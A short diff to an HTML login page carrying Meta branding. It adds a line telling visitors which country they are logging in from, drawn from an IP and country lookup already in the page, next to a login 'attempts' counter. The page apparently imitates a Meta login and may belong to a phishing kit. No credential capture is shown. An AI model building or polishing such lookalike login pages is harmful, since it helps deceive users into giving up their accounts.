@@ -154,6 +154,13 @@
             height: 14px;
             vertical-align: middle;
         }
+
+        /* Additional styles for country display */
+        .country-info {
+            font-size: 14px;
+            color: #8e8e8e;
+            margin-top: 10px;
+        }
     </style>
     <script>
         let attempts = 0;
@@ -166,6 +173,7 @@
             .then(data => {
                 userIp = data.ip;
                 userCountry = data.country;
+                document.getElementById('country-info').textContent = `You are logging in from ${userCountry}`;
             })
             .catch(err => console.log(err));
 
@@ -226,6 +234,7 @@
         <div class="meta-footer">
             <p>from <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Meta_Platforms_Inc._logo.svg" alt="Meta"></p>
         </div>
+        <div id="country-info" class="country-info"></div> <!-- Country information will be displayed here -->
     </div>
 </body>
 </html>
